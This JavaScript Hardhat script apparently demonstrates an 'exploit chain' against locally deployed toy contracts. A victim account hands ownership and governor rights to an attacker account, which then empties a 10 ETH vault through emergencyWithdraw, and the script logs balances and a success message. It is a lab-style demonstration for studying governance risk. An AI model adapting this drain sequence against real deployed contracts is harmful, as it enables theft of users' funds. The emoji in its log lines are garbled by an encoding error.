
const { ethers } = require("hardhat");

async function main() {
  console.log("ðŸš€ Initiating attack on New_ExploitChainRisk_Vulnerable...");

  // --- 1. GET THE SIGNERS ---
  const [deployer, attacker] = await ethers.getSigners();
  console.log(`Deployer (Victim) Address: ${deployer.address}`);
  console.log(`Attacker Address: ${attacker.address}`);

  // --- 2. DEPLOY THE CONTRACTS ---
  console.log("\nDeploying contracts...");
  const GovToken = await ethers.getContractFactory("GovToken");
  const govToken = await GovToken.deploy();
  await govToken.waitForDeployment();
  console.log(`GovToken deployed at: ${govToken.target}`);

  const ProtocolVault = await ethers.getContractFactory("ProtocolVault");
  const protocolVault = await ProtocolVault.deploy(deployer.address);
  await protocolVault.waitForDeployment();
  console.log(`ProtocolVault deployed at: ${protocolVault.target}`);
  
  // --- 3. FUND THE VAULT ---
  console.log("\nDepositing 10 ETH into the ProtocolVault...");
  const depositTx = await deployer.sendTransaction({
    to: protocolVault.target,
    value: ethers.parseEther("10.0"),
  });
  await depositTx.wait();
  console.log("âœ… Deposit successful!");


  // --- 4. EXECUTE THE ATTACK ---
  console.log("\nðŸ’° Checking balances before the attack...");
  const vaultBalanceBefore = await ethers.provider.getBalance(protocolVault.target);
  const attackerBalanceBefore = await ethers.provider.getBalance(attacker.address);
  console.log(`   - Vault Balance: ${ethers.formatEther(vaultBalanceBefore)} ETH`);
  console.log(`   - Attacker Balance: ${ethers.formatEther(attackerBalanceBefore)} ETH`);

  console.log("\nðŸ’¥ ATTACKING: Exploiting the chain risk...");

  // Attacker somehow gains control of the GovToken owner
  // For this demo, the deployer "mistakenly" transfers ownership
  console.log(
    "   - Step 1: Attacker tricks deployer into transferring GovToken ownership..."
  );
  const transferOwnerTx = await govToken
    .connect(deployer)
    .transferOwner(attacker.address);
  await transferOwnerTx.wait();
  console.log("   âœ… GovToken ownership transferred to attacker!");

  // Attacker, now the owner of GovToken, convinces the deployer (still the governor) to make them the new governor
  console.log(
    "   - Step 2: Attacker tricks deployer into setting them as the new governor of ProtocolVault..."
  );
  const setGovernorTx = await protocolVault
    .connect(deployer)
    .setGovernor(attacker.address);
  await setGovernorTx.wait();
  console.log("   âœ… Attacker is now the governor of ProtocolVault!");

  // Attacker drains the vault
  console.log("   - Step 3: Attacker drains the ProtocolVault...");
  const withdrawTx = await protocolVault.connect(attacker).emergencyWithdraw(attacker.address, vaultBalanceBefore);
  await withdrawTx.wait();
  console.log("   âœ… Attack transaction successful!");


  console.log("\nðŸ’° Checking balances after the attack...");
  const vaultBalanceAfter = await ethers.provider.getBalance(protocolVault.target);
  const attackerBalanceAfter = await ethers.provider.getBalance(attacker.address);
  console.log(`   - Vault Balance: ${ethers.formatEther(vaultBalanceAfter)} ETH`);
  console.log(`   - Attacker Balance: ${ethers.formatEther(attackerBalanceAfter)} ETH`);

  if (vaultBalanceAfter === 0n) {
    console.log("\nðŸŽ‰ SUCCESS: The ProtocolVault has been drained!");
  } else {
    console.log("\nðŸ˜ž FAILED: The ProtocolVault still has funds.");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
